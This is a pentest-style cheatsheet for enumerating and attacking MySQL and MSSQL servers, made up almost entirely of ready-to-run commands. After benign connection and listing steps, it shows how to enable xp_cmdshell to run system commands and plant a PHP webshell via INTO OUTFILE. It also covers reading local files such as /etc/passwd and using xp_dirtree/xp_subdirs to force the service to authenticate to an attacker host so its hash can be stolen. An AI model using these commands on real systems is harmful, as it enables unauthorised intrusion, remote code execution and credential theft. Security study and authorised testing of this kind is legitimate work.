# SQL Enumeration Cheatsheet

Enumerating MySQL (port 3306) and MSSQL (ports 1433, 2433) services.

## 1. Enumerate SQL Service and Version (nmap)
Gather SQL service and version information.
```
nmap -Pn -sV -sC -p1433,3306 target.com
```
- `-Pn`: Skips host discovery.
- `-sV`: Detects service and version.
- `-sC`: Runs default scripts (e.g., `ms-sql-info`).

## 2. Connect to MySQL (mysql)
Connect to a MySQL server.
```
mysql -u user -p'password' -h target.com
```
- `-u user`: Specify username.
- `-p'password'`: Specify password.
- `-h`: Target host.

## 3. Connect to MSSQL (sqlcmd)
Connect to an MSSQL server from Windows.
```
sqlcmd -S target.com -U user -P 'password' -y 30 -Y 30
```
- `-S`: Target server.
- `-U user`: Username.
- `-P 'password'`: Password.
- `-y 30 -Y 30`: Adjusts output width.

## 4. Connect to MSSQL from Linux (sqsh)
Connect to MSSQL from Linux.
```
sqsh -S target.com -U user -P 'password' -h
```
- `-S`: Target server.
- `-U user`: Username.
- `-P 'password'`: Password.
- `-h`: Disables headers for cleaner output.

## 5. Connect to MSSQL with Windows Auth (sqsh)
Connect to MSSQL using Windows Authentication.
```
sqsh -S target.com -U .\\user -P 'password' -h
```
- `-U .\\user`: Username with local host prefix for Windows Auth.

## 6. Show MySQL Databases
List all available databases in MySQL.
```
mysql> SHOW DATABASES;
```

## 7. Select MySQL Database
Switch to a specific database in MySQL.
```
mysql> USE dbname;
```

## 8. Show MySQL Tables
List tables in the selected database in MySQL.
```
mysql> SHOW TABLES;
```

## 9. Select MySQL Table Data
Retrieve all entries from a table in MySQL.
```
mysql> SELECT * FROM users;
```

## 10. Show MSSQL Databases
List all available databases in MSSQL.
```
sqlcmd> SELECT name FROM master.dbo.sysdatabases
sqlcmd> GO
```

## 11. Select MSSQL Database
Switch to a specific database in MSSQL.
```
sqlcmd> USE dbname
sqlcmd> GO
```

## 12. Show MSSQL Tables
List tables in the selected database in MSSQL.
```
sqlcmd> SELECT * FROM dbname.INFORMATION_SCHEMA.TABLES
sqlcmd> GO
```

## 13. Select MSSQL Table Data
Retrieve all entries from a table in MSSQL.
```
sqlcmd> SELECT * FROM users
sqlcmd> GO
```

## 14. Enable xp_cmdshell in MSSQL
Enable command execution in MSSQL (requires admin privileges).
```
sqlcmd> EXECUTE sp_configure 'show advanced options', 1
sqlcmd> GO
sqlcmd> RECONFIGURE
sqlcmd> GO
sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1
sqlcmd> GO
sqlcmd> RECONFIGURE
sqlcmd> GO
```

## 15. Execute System Command in MSSQL
Run a system command via MSSQL (if xp_cmdshell enabled).
```
sqlcmd> xp_cmdshell 'whoami'
sqlcmd> GO
```

## 16. Write File in MySQL
Create a file (e.g., webshell) using MySQL (requires FILE privilege).
```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

## 17. Check MySQL File Privileges
Verify if secure_file_priv is empty for file operations.
```
mysql> show variables like "secure_file_priv";
```

## 18. Read Local Files in MySQL
Read local files in MySQL (requires FILE privilege).
```
mysql> select LOAD_FILE("/etc/passwd");
```

## 19. Read Local Files in MSSQL
Read local files in MSSQL (requires read access).
```
sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
sqlcmd> GO
```

## 20. Steal MSSQL Service Hash (xp_dirtree)
Force MSSQL to authenticate to a fake SMB share.
```
sqlcmd> EXEC master..xp_dirtree '\\attacker.com\share\'
sqlcmd> GO
```

## 21. Steal MSSQL Service Hash (xp_subdirs)
Force MSSQL to authenticate to a fake SMB share.
```
sqlcmd> EXEC master..xp_subdirs '\\attacker.com\share\'
sqlcmd> GO
```

## 22. Identify Linked Servers in MSSQL
List linked servers in MSSQL.
```
sqlcmd> SELECT srvname, isremote FROM sysservers
sqlcmd> GO
```

## 23. Query Linked Server in MSSQL
Check user and privileges on a linked server.
```
sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [linkedserver.com]
sqlcmd> GO
```

## Tips
- Check for weak credentials or misconfigurations (e.g., anonymous access, empty secure_file_priv).
- Use tools like Responder or impacket-smbserver to capture hashes with xp_dirtree/xp_subdirs.
- Ensure admin privileges for advanced actions (e.g., xp_cmdshell, linked server queries).
- Be cautious with command execution and file operations; verify permissions.